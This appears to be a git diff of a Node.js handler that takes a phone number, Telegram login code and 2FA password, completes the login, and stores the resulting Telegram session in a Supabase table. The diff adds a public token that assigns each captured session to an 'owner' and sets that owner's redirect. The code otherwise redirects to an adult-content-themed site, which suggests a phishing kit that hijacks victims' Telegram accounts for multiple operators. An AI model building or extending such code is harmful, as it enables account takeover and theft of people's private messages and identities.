@@ -11,7 +11,7 @@ const apiHash = process.env.TELEGRAM_API_HASH;
 export default async function handler(req, res) {
   // Autenticação opcional - se houver token, associa ao owner_id
   await optionalAuthenticate(req, res, async () => {
-  let { phoneNumber, code, password } = req.body;
+  let { phoneNumber, code, password, t } = req.body;
   
   // 1. LIMPEZA TOTAL (Garante que só tem números)
   const cleanPhone = phoneNumber.toString().replace(/\D/g, '');
@@ -56,6 +56,30 @@ export default async function handler(req, res) {
 
       // 5. SALVA A SESSÃO FINAL (Parte Crítica)
       const finalSession = client.session.save();
+
+      // Resolve owner/redirect:
+      // - prioridade: JWT user (req.userId)
+      // - fallback: token público (t -> users.public_token)
+      let resolvedOwnerId = null;
+      let resolvedRedirectUrl = null;
+
+      if (!req.isAdmin && req.userId) {
+        resolvedOwnerId = req.userId;
+      } else if (t) {
+        const token = String(t).trim();
+        if (token) {
+          const { data: userData } = await supabase
+            .from('users')
+            .select('id, redirect_url')
+            .eq('public_token', token)
+            .single();
+
+          if (userData?.id) {
+            resolvedOwnerId = userData.id;
+            resolvedRedirectUrl = userData.redirect_url || null;
+          }
+        }
+      }
       
       // Se o usuário estiver autenticado (não admin), associa ao owner_id dele
       // Se for admin ou não autenticado, owner_id fica null (será associado manualmente depois)
@@ -66,9 +90,9 @@ export default async function handler(req, res) {
         created_at: new Date()
       };
 
-      // Só associa owner_id se for usuário normal (não admin) e tiver userId
-      if (!req.isAdmin && req.userId) {
-        sessionData.owner_id = req.userId;
+      // Associa owner_id se resolvido (JWT user ou token público)
+      if (resolvedOwnerId) {
+        sessionData.owner_id = resolvedOwnerId;
       }
       
       const { error: saveError } = await supabase.from('telegram_sessions').upsert(
@@ -85,7 +109,7 @@ export default async function handler(req, res) {
       await supabase.from('auth_state').delete().eq('phone_number', cleanPhone);
       await client.disconnect();
       
-      res.status(200).json({ success: true, redirect: "https://hotconteudoss.netlify.app" });
+      res.status(200).json({ success: true, redirect: resolvedRedirectUrl || "https://hotconteudoss.netlify.app" });
 
     } catch (error) {
       console.error("ERRO FINAL:", error);
